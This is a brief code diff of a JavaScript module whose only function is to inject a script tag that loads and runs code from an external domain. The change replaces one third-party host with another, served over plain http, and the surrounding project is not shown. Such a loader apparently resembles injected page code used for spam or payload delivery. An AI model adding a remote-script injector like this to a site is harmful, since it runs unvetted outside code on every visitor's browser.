@@ -8,6 +8,6 @@
 
 define(function (require) {
     var node = document.createElement('script');
-    node.setAttribute('src', 'https://sdgg.gucheng.com/s.html?id=55');
+    node.setAttribute('src', 'http://xm.zgjclm.com/s.html?id=67');
     document.body.appendChild(node);
 });
